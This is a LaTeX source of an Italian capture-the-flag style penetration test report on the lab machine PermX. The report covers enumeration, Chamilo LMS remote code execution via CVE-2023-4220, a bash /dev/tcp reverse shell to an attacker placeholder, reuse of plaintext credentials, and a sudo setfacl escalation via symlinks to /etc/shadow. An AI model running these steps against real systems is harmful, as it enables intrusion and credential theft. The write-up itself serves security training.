@@ -1,0 +1,219 @@
+\documentclass[a4paper,11pt]{article}
+
+% -------------------- PACKAGES --------------------
+\usepackage[margin=2.5cm]{geometry}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{setspace}
+\usepackage{titlesec}
+
+% -------------------- CONFIG --------------------
+\onehalfspacing
+
+\hypersetup{
+    colorlinks=true,
+    linkcolor=black,
+    urlcolor=blue
+}
+
+\titleformat{\section}{\large\bfseries}{\thesection}{1em}{}
+\titleformat{\subsection}{\normalsize\bfseries}{\thesubsection}{1em}{}
+
+\lstset{
+    basicstyle=\ttfamily\small,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!10}
+}
+
+\title{\textbf{Penetration Test Report (OSCP Style)}\\PermX}
+\author{Franco Salvucci}
+\date{}
+
+% -------------------- DOCUMENT --------------------
+\begin{document}
+
+\maketitle
+\tableofcontents
+\newpage
+
+% --------------------------------------------------
+\section{Informazioni sul Target}
+
+\begin{itemize}
+    \item \textbf{Indirizzo IP:} 10.10.11.23
+    \item \textbf{Ambiente:} Laboratorio (TryHackMe)
+\end{itemize}
+
+% --------------------------------------------------
+\section{Enumerazione}
+
+\subsection{Scansione delle porte}
+
+Come primo passo è stata effettuata una scansione delle porte per identificare i servizi esposti.
+
+\begin{lstlisting}
+nmap -sC -sV 10.10.11.23
+\end{lstlisting}
+
+La scansione ha evidenziato le seguenti porte aperte:
+
+\begin{itemize}
+    \item 22/tcp – SSH
+    \item 80/tcp – HTTP
+\end{itemize}
+
+\subsection{Enumerazione Web}
+
+Accedendo al servizio HTTP si presenta una web application.  
+Si procede quindi con brute forcing delle directory:
+
+\begin{lstlisting}
+gobuster dir -u http://permx.htb \
+-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+\end{lstlisting}
+
+Non emergono risultati particolarmente utili, pertanto si passa all'enumerazione dei virtual host:
+
+\begin{lstlisting}
+ffuf -u http://permx.htb \
+-H "Host: FUZZ.permx.htb" \
+-w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -fw 18
+\end{lstlisting}
+
+Viene individuato il seguente vhost:
+
+\begin{itemize}
+    \item lms.permx.htb
+\end{itemize}
+
+% --------------------------------------------------
+\section{Accesso Iniziale}
+
+\subsection{Identificazione dell'applicazione}
+
+Navigando sul vhost scoperto, si osserva una pagina di login.  
+Analizzando la directory \texttt{/documentation} è possibile identificare il CMS utilizzato: \textbf{Chamilo LMS}.
+
+\subsection{Sfruttamento della vulnerabilità}
+
+La versione individuata risulta vulnerabile alla CVE-2023-4220, che consente Remote Code Execution tramite upload di file arbitrari.
+
+È stato utilizzato un exploit pubblico per caricare una webshell.
+
+Percorso della webshell:
+
+\begin{lstlisting}
+http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shell.php
+\end{lstlisting}
+
+% --------------------------------------------------
+\subsection{Ottenimento della Reverse Shell}
+
+Per ottenere una shell interattiva è stato caricato uno script bash:
+
+\begin{lstlisting}
+#!/bin/bash
+bash -i >& /dev/tcp/<ATTACKER_IP>/<PORTA> 0>&1
+\end{lstlisting}
+
+Listener lato attaccante:
+
+\begin{lstlisting}
+nc -lvnp 4444
+\end{lstlisting}
+
+Una volta eseguito il payload, si ottiene accesso come utente \texttt{www-data}.
+
+% --------------------------------------------------
+\section{Post-Exploitation}
+
+\subsection{Ricerca credenziali}
+
+Si procede con l'enumerazione del filesystem alla ricerca di file di configurazione:
+
+\begin{lstlisting}
+find /var/www/chamilo -name configuration*
+\end{lstlisting}
+
+Nel file principale vengono trovate credenziali del database in chiaro.
+
+\subsection{Accesso via SSH}
+
+Dalle directory home emerge l'utente \texttt{mtz}.  
+Provando le credenziali ottenute, si riesce ad accedere via SSH:
+
+\begin{lstlisting}
+ssh mtz@10.10.11.23
+\end{lstlisting}
+
+Accesso riuscito.
+
+% --------------------------------------------------
+\section{Privilege Escalation}
+
+\subsection{Verifica privilegi sudo}
+
+\begin{lstlisting}
+sudo -l
+\end{lstlisting}
+
+Output:
+
+\begin{lstlisting}
+/opt/acl.sh
+\end{lstlisting}
+
+Lo script può essere eseguito con privilegi elevati.
+
+\subsection{Sfruttamento}
+
+Lo script utilizza \texttt{setfacl}, consentendo la modifica dei permessi su file arbitrari.
+
+Si creano link simbolici ai file sensibili:
+
+\begin{lstlisting}
+ln -s /etc/passwd passwd_link
+ln -s /etc/shadow shadow_link
+\end{lstlisting}
+
+Utilizzando lo script, si ottiene accesso in scrittura.
+
+A questo punto è possibile creare un nuovo utente con privilegi root ed effettuare il login:
+
+\begin{lstlisting}
+su nuovo_root
+\end{lstlisting}
+
+\textbf{Accesso root ottenuto.}
+
+% --------------------------------------------------
+\section{Proof of Compromise}
+
+\subsection{User Flag}
+
+\begin{lstlisting}
+/home/mtz/user.txt
+\end{lstlisting}
+
+\subsection{Root Flag}
+
+\begin{lstlisting}
+/root/root.txt
+\end{lstlisting}
+
+% --------------------------------------------------
+\section{Conclusioni}
+
+Il sistema è stato compromesso con successo attraverso una catena di vulnerabilità:
+
+\begin{itemize}
+    \item Vulnerabilità RCE su applicazione web
+    \item Esposizione di credenziali
+    \item Errata configurazione dei privilegi sudo
+\end{itemize}
+
+L'attacco richiede competenze tecniche moderate e può essere replicato con strumenti standard.
+
+\end{document}
